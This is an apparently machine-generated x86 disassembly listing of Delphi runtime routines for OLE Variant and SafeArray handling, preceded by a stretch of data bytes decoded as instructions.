xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
jb r-xdata
outsd
add [ eax + eax ] cl
add [ eax ] al
xor al 0x77
inc eax
add al bl
xor al 0x40
add [ eax ] al
xor al 0x77
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
rcr al 0xdf
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
fild [ eax ]
or al 0x0
fild [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsd
jb r-xdata
sub [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax + 0x18004032 ] al
outsd
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ ecx ] cl
inc eax
add [ eax ] al
add [ eax ] al
popad
outsb
je r-xdata
popad
jb r-xdata
popad
jns r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
inc eax
add [ eax + 0x40e0 ] ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ 0x72615645 ] dl
inc eax
add [ eax + eax ] cl
add [ eax ] al
xor al 0x77
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] bl
inc eax
insd
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax * 2 + 0x69726156 ] dl
inc eax
jb r-xdata
add [ eax ] al
jb r-xdata
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e0 ] ch
add [ eax ] al
add [ edi + esi * 2 ] dh
inc eax
add al bl
xor al 0x40
outsd
jb r-xdata
add [ eax + 0x15004032 ] al
inc ebp
push esi
popad
jb r-xdata
outsb
js r-xdata
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add [ eax - 0x20 ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x20 ] al
inc eax
add esp 0xffffffe4
push ebx
popad
outsb
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
fsub st1
inc eax
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc eax
add [ ecx + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x40 ] dh
add [ eax + eax ] cl
add [ eax ] al
xor al 0x77
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e241
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
imul esi [ ebx + 0x70 ] 0x68637461
inc ebp
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
xor eax eax
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
dec ebp
in al 0x8b
mov ebx eax
popad
push 0x0
xor eax eax
push ebp
push sub_40e23a
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
add [ eax + eax ] cl
add [ eax ] al
xor al 0x77
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
loope r-xdata
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
inc eax
add [ eax + eax ] cl
add [ eax ] al
xor al 0x77
inc eax
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
push sub_40e2d3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40ff34
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40ff34
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e2da
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404004
retn
outsd
loope r-xdata
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
jb r-xdata
push 0x6f727245
je r-xdata
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
add [ edx + esi + 0x40 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_40e1f0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e23a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e241
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_40e244
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e2d3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40ff34
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40ff34
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e2da
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404004
retn
sub_40e2e0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e32a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e331
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_40e334
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e3c3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40ff34
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40ff34
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e3ca
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404004
retn
sub_40e3d0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e41a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e421
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_40e424
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40e669
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e670
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_404004
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_404004
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
jmp r-xdata
dec eax
je r-xdata
call sub_40e1f0
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
jmp r-xdata
jmp r-xdata
call sub_40e2e0
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40ac88
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
call sub_403a1c
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
jmp r-xdata
jmp r-xdata
sub_40e684
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e244
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e334
jmp r-xdata
jmp r-xdata
call sub_40e424
sub_40e6b8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e702
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e709
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_40e720
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e750
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e750
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e7ac
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e678
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40e678
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e720
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40e678
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40e678
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40e750
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e678
mov eax [ ebp - 0x314 ]
call sub_40e9a4
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40e928
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40e678
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403fe0
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_410390
test al al
je r-xdata
mov eax ebx
call sub_40e7ac
jmp r-xdata
push ebx
call VariantClear
call sub_40e678
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40e9c0
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e9f0
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e9f0
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ea4c
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e678
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40e678
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40e9a4
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e3d0
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40e678
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40e678
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e9c0
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40e9f0
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e678
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40e678
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ec20
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40e928
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40e678
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_404034
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_410390
test al al
je r-xdata
mov ecx sub_40ec18
mov edx esi
mov eax ebx
call sub_40ea4c
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40e678
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40eccc
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40ec20
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40e928
sub_40ed10
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4046c0
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40e684
pop ebx
pop ebp
retn 0x8
sub_40ed48
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4046c0
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40e684
pop ebx
pop ebp
retn 0x8
sub_40ed80
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40ee36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4046c0
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40e684
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ee3d
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404004
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_404268
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407c04
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_40480c
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404268
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407bc8
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40480c
jmp r-xdata
jmp r-xdata
call sub_40e2e0
sub_40ee44
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ef03
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40eee1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40e684
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4047d0
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4048bc
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404268
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eee8
lea eax [ ebp - 0x10 ]
call sub_40e9a4
retn
sub_40ef10
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40ef66
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40eccc
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40eff8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ef6d
lea eax [ ebp - 0x10 ]
call sub_40e9a4
retn
sub_40ef74
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410390
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40efe9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
